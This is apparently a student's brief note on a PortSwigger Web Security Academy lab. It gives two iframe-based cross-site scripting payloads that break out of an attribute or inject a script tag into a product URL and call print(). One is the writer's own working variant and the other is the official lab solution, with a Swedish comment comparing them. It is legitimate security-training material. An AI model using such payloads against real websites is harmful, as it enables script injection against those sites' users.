```
<iframe src="https://0a100011042ff5e2848c51f400cc0087.web-security-academy.net/product?productId=1&a=a%27%3E%3C/a%3E%3Cimg%20src=0%20onerror=%27print()%27%3E%3Ca%27" onload="if(!window.X){window.location = 'https://0a100011042ff5e2848c51f400cc0087.web-security-academy.net/'}">
</iframe>
```

nedan är labblösningen enligt portswigger men ovan funkade också
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" 
onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

